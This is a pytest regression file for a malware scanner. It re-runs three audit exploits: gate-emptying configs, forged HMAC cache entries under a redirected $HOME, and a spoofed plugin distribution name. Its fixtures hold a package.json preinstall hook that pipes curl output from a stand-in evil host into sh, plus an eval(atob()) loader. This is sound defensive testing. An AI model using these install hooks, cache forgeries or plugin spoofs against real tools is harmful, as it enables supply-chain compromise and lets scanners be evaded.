"""The three critical findings from the 2026-09-08 adversarial audit.

Each has a working exploit in the audit and each is reproduced here, because a
fix for an attack nobody re-runs is a fix nobody knows still works.

What links them is that all three were controls whose *reasoning* was right and
whose *anchor* was wrong. The gate was clamped for limits and not for itself;
the cache key was moved out of one variable's reach into another's; plugin trust
was moved off the attacker-controlled entry-point name onto the
attacker-controlled distribution name. In each case the docstring explaining the
danger was already there and already correct.
"""

from __future__ import annotations

import hmac
import json
import os
import secrets
import subprocess
import sys
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.cache import KEY_NAME, ScanCache
from cordon_scanner.core.config import Config, ConfigResolver
from cordon_scanner.core.errors import ConfigError
from cordon_scanner.core.models import Severity

PAYLOAD_JSON = (
    '{"name":"x","version":"1.0.0","scripts":'
    '{"preinstall":"curl -s https://evil.invalid/i.sh | sh"}}'
)
PAYLOAD_JS = 'eval(atob("cGF5bG9hZA=="))\n'


def hostile(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(PAYLOAD_JSON, encoding="utf-8")
    (root / "loader.js").write_text(PAYLOAD_JS, encoding="utf-8")
    return root


class TestC1GateCannotBeEmptiedByTheTarget:
    """A five-line config in the scan target removed a CRITICAL malware finding
    entirely: exit 0, `complete: true`, no POLICY finding, output
    indistinguishable from a clean repository.

    It also disarmed a different fix. `filter_for_reporting` keeps any finding
    that trips the gate regardless of a reporting threshold, precisely so a
    repository cannot hide a critical finding behind
    `confidence_threshold: confirmed`. That protection was conditioned on the
    gate being non-empty, and the same untrusted file controlled both.
    """

    def scan(self, root: Path):
        config = ConfigResolver.resolve(root=root).with_overrides(use_cache=False)
        return Scanner(config).scan(root)

    def test_an_empty_fail_on_is_refused(self, tmp_path: Path) -> None:
        """ "Fail on nothing" is not a setting anybody means. It produces a scan
        that finds things and exits 0."""
        root = hostile(tmp_path / "pkg")
        (root / "cordon.yaml").write_text("version: 1\npolicy:\n  fail_on: []\n", encoding="utf-8")
        with pytest.raises(ConfigError, match="fail_on is empty"):
            ConfigResolver.resolve(root=root)

    def test_a_weakened_gate_is_clamped_and_reported(self, tmp_path: Path) -> None:
        root = hostile(tmp_path / "pkg")
        (root / "cordon.yaml").write_text(
            "version: 1\nscan:\n  confidence_threshold: confirmed\n"
            "policy:\n  fail_on: [critical]\n  min_confidence_to_fail: confirmed\n",
            encoding="utf-8",
        )
        result = self.scan(root)
        rules = {f.rule_id for f in result.findings}

        assert "MALWARE.INSTALL.FETCH_EXEC.001" in rules, "the critical finding vanished again"
        assert "POLICY.CONFIG.GATE_WEAKENED" in rules, "the attempt was not reported"

    def test_the_report_of_it_is_not_a_footnote(self, tmp_path: Path) -> None:
        """Raising a resource limit is a repository being greedy with the
        scanning machine. Emptying the gate is a repository turning off the
        verdict for every finding including MALICIOUS. They must not read the
        same."""
        root = hostile(tmp_path / "pkg")
        (root / "cordon.yaml").write_text(
            "version: 1\npolicy:\n  fail_on: [critical]\n", encoding="utf-8"
        )
        weakened = next(
            f for f in self.scan(root).findings if f.rule_id == "POLICY.CONFIG.GATE_WEAKENED"
        )
        assert weakened.severity >= Severity.HIGH

    def test_malicious_cannot_be_removed_from_the_gate(self, tmp_path: Path) -> None:
        root = hostile(tmp_path / "pkg")
        (root / "cordon.yaml").write_text(
            "version: 1\npolicy:\n  fail_on: [low]\n", encoding="utf-8"
        )
        from cordon_scanner.core.models import Category

        config = ConfigResolver.resolve(root=root)
        assert Category.MALICIOUS in config.policy.fail_on_categories

    def test_the_build_still_fails(self, tmp_path: Path) -> None:
        """The end the attacker cared about."""
        root = hostile(tmp_path / "pkg")
        (root / "cordon.yaml").write_text(
            "version: 1\nscan:\n  confidence_threshold: confirmed\n"
            "policy:\n  fail_on: [critical]\n",
            encoding="utf-8",
        )
        result = subprocess.run(
            [sys.executable, "-m", "cordon_scanner", "scan", str(root), "--no-cache", "--quiet"],
            capture_output=True,
            text=True,
            check=False,
        )
        assert result.returncode == 1, result.stdout + result.stderr


@pytest.mark.skipif(os.name == "nt", reason="POSIX account store")
class TestC2CacheKeyIsNotEnvironmentDirected:
    """The key lived beside the entries, so one variable decided both. Moving it
    to `Path.home()` did not fix that: `Path.home()` reads `$HOME`, which the
    same attacker sets in the same `env:` block. The audit planted a key under a
    redirected `$HOME`, computed each cache key from inputs that are all public,
    wrote correctly-MAC'd empty results, and got exit 0 over a payload.
    """

    def test_home_does_not_move_the_key(self, tmp_path, monkeypatch) -> None:
        monkeypatch.setenv("HOME", str(tmp_path / "fake"))
        # `key_dir` is patched globally by conftest for isolation, so the
        # property is asserted on the underlying lookup.
        assert not str(ScanCache._home()).startswith(str(tmp_path))

    def test_the_account_store_is_the_anchor(self) -> None:
        import pwd

        assert ScanCache._home() == Path(pwd.getpwuid(os.getuid()).pw_dir)

    def test_a_key_from_elsewhere_does_not_validate(self, tmp_path, monkeypatch) -> None:
        """The identity binding. A key file copied out of one home does not
        authenticate entries read under another."""
        root = tmp_path / "repo"
        root.mkdir()
        (root / "evil.js").write_text(PAYLOAD_JS, encoding="utf-8")

        entries = tmp_path / "entries"
        config = Config.default().with_overrides(use_cache=True, cache_dir=str(entries))
        assert Scanner(config).scan(root).findings

        # The attacker's key, and forged empty results MAC'd with it exactly as
        # the tool would have.
        planted = secrets.token_bytes(32)
        (ScanCache.key_dir() / KEY_NAME).write_bytes(planted)
        forged = 0
        for entry in entries.rglob("*.json"):
            body = json.dumps([], separators=(",", ":"), sort_keys=True).encode()
            mac = hmac.new(planted, entry.stem.encode("ascii") + b"|" + body, "sha256").hexdigest()
            entry.write_text(json.dumps({"findings": [], "mac": mac}), encoding="utf-8")
            forged += 1
        assert forged, "nothing was cached, so this proves nothing"

        assert Scanner(config).scan(root).findings, "a forged clean result was accepted"

    def test_the_mac_binds_identity_and_location(self) -> None:
        cache = ScanCache(enabled=True)
        assert cache._identity() == os.getuid()


class TestC3PluginTrustIsAnchoredOnLocation:
    """`Name: cordon-scanner` in a `.dist-info/METADATA` file is plaintext that
    anything on `sys.path` can write. The audit shipped a stub declaring it and
    had its code executed inside the scanner with plugins disabled.
    """

    def fake_distribution(self, tmp_path: Path, marker: Path) -> Path:
        root = tmp_path / "fake"
        info = root / "evil_plugin-1.0.dist-info"
        info.mkdir(parents=True)
        (root / "evilmod.py").write_text(
            "import pathlib\n"
            "class Boom:\n"
            "    id = 'evil'\n"
            "    version = '1'\n"
            "    def __init__(self):\n"
            f"        pathlib.Path({str(marker)!r}).write_text('executed')\n",
            encoding="utf-8",
        )
        (info / "METADATA").write_text(
            "Metadata-Version: 2.1\nName: cordon-scanner\nVersion: 1.0\n", encoding="utf-8"
        )
        (info / "entry_points.txt").write_text(
            "[cordon_scanner.detectors]\nevilmod = evilmod:Boom\n", encoding="utf-8"
        )
        (info / "RECORD").write_text("", encoding="utf-8")
        return root

    def test_a_forged_distribution_name_executes_nothing(self, tmp_path: Path) -> None:
        marker = tmp_path / "PWNED"
        fake = self.fake_distribution(tmp_path, marker)
        target = tmp_path / "target"
        target.mkdir()
        (target / "app.js").write_text("const a = 1;\n", encoding="utf-8")

        environment = {**os.environ, "PYTHONPATH": str(fake)}
        subprocess.run(
            [sys.executable, "-m", "cordon_scanner", "scan", str(target), "--no-cache", "--quiet"],
            capture_output=True,
            text=True,
            check=False,
            env=environment,
        )
        assert not marker.exists(), "the plugin's code ran inside the scanner"

    def test_the_built_ins_still_load(self) -> None:
        """A location check that rejects everything would be a working fix and a
        broken product."""
        from cordon_scanner.core.registry import Registry

        detectors = Registry().detectors()
        assert {d.id for d in detectors} >= {"capability", "manifest", "secrets"}

    def test_trust_is_not_decided_by_metadata_alone(self) -> None:
        from cordon_scanner.core.registry import DISTRIBUTION, Registry

        class Claim:
            name = "evilmod"
            module = "evilmod"
            value = "evilmod:Boom"

        assert not Registry()._is_ours(Claim(), DISTRIBUTION)
